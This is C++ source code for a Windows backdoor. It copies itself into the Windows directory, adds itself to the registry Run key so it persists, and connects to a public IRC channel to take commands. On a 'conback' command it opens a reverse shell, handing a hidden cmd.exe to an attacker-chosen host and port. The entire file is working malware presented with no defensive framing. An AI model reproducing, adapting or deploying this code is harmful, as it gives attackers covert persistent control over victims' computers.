// conbackshell.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <winsock2.h>
#include <fstream>

using namespace std;

bool run = true;

bool resolve(const char* host, unsigned long *addr);
bool conback(const char* host, unsigned int port);
bool connectIRC(const char* nick, const char* channel, const char* server, unsigned int port);

//-----------------------------------------------------------------------------
int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	WSAData data;
	WSAStartup(MAKEWORD(1,1),&data);
	
	char ch;
	char filename[MAX_PATH];		
	char windir[MAX_PATH];

	GetModuleFileName(NULL,filename,MAX_PATH);
	GetWindowsDirectory(windir,MAX_PATH);

	ifstream* in = new ifstream(filename,ios::in|ios::binary);
	if(*in)
	{
		strcat(windir,"\\conback.exe");
		ofstream* out = new ofstream(windir,ios::out|ios::binary);
		if(*out)
		{
			while(!in->eof())
			{
				in->read(&ch,1); out->write(&ch,1);
			}
			out->close(); delete out;

			HKEY key;

		    RegCreateKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\run", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &key, 0);
			RegSetValueEx(key,"(Default)",0,REG_SZ,(const unsigned char*)windir,strlen(windir));

		    RegCloseKey(key);			
		}	
		in->close(); delete in;
	}		

	while(run)
	{
		char name[256];
		gethostname(name,256);
		connectIRC(name,"#test-mybot","irc.efnet.pl",6667);		
		Sleep(5000);
	}

	WSACleanup();
	return 0;
}

//-----------------------------------------------------------------------------
bool resolve(const char* host, unsigned long *addr)
{
	struct hostent* h;

	if((*addr = inet_addr(host)) == INADDR_NONE)
	{
		if((h = gethostbyname(host)) == NULL) return false;
		else memcpy(addr,h->h_addr,4);
	}

	return true;
}

//-----------------------------------------------------------------------------
bool connectIRC(const char* nick, const char* channel, const char* server, unsigned int port)
{
	int cs;
	unsigned long addr;
	char rBuf[2046], sBuf[2046];

	if(!resolve(server,&addr)) return false;

	struct sockaddr_in host;
	
	host.sin_family = AF_INET;
	host.sin_port   = htons(port);
	host.sin_addr.S_un.S_addr = addr;
	memset(host.sin_zero,0,8);
		
	cs = socket(AF_INET,SOCK_STREAM,0);

	if(connect(cs,(struct sockaddr*)&host,sizeof(struct sockaddr_in)) != 0)
	{
		closesocket(cs);
		return false;
	}
	
	recv(cs,rBuf,2046,0);

	strcpy(sBuf,"USER ");
	strcat(sBuf, nick);
	strcat(sBuf, " localhost localhost :IrcBot Notify\n");
	send(cs,sBuf,strlen(sBuf),0);

	strcpy(sBuf,"NICK ");
	strcat(sBuf,nick);
	strcat(sBuf,"\n\n");
	send(cs,sBuf,strlen(sBuf),0);

	recv(cs,rBuf,2046,0);

	strcpy(sBuf,"JOIN ");
	strcat(sBuf,channel);
	strcat(sBuf,"\n");
	send(cs,sBuf,strlen(sBuf),0);
	
	recv(cs,rBuf,2046,0);

	while(recv(cs,rBuf,2046,0) > 0 && run)
	{
		if(strstr(rBuf,nick) != NULL) 
		{
			if(strstr(rBuf,"quit") != NULL)
			{
				strcpy(sBuf,"QUIT\n\n");
				send(cs,sBuf,strlen(sBuf),0);
				closesocket(cs);
				run = false;
			}
			else if(strstr(rBuf,"conback") != NULL)
			{
				char* buf = new char[strlen(rBuf)+1];
				
				strcpy(buf,strstr(rBuf,"conback"));

				char r_host[128];
				char r_port[128];

				strtok(buf," ");
				strcpy(r_host,strtok(NULL," "));
				strcpy(r_port,strtok(NULL," "));

				conback(r_host, atoi(r_port));

				delete buf;
			}
		}
		memset(rBuf,0,2046);
	}

	strcpy(sBuf,"quit\n\n");
	send(cs,sBuf,strlen(sBuf),0);

	closesocket(cs);
	return true;
}

//-----------------------------------------------------------------------------
bool conback(const char* host, unsigned int port)
{	
	struct sockaddr_in server;
	unsigned long addr;
	int cs;
	
	if(!resolve(host,&addr)) return false;

	server.sin_family = AF_INET;
	server.sin_port   = htons(port);
	server.sin_addr.S_un.S_addr = addr;
	memset(server.sin_zero,0,8);	

	cs = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	if(connect(cs,(struct sockaddr*)&server,sizeof(struct sockaddr_in)) != 0)
	{
		closesocket(cs);
		return false;
	}

	STARTUPINFO s_info;
	PROCESS_INFORMATION p_info;				
	GetStartupInfo(&s_info);

	s_info.dwFlags	   = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;				
	s_info.wShowWindow = SW_HIDE;				
	s_info.hStdError   = (HANDLE)cs;
	s_info.hStdInput   = (HANDLE)cs;
	s_info.hStdOutput  = (HANDLE)cs;

	if(!CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, 0, NULL, &s_info, &p_info))
	{
		closesocket(cs);
		return false;
	}

	closesocket(cs);
	return true;
}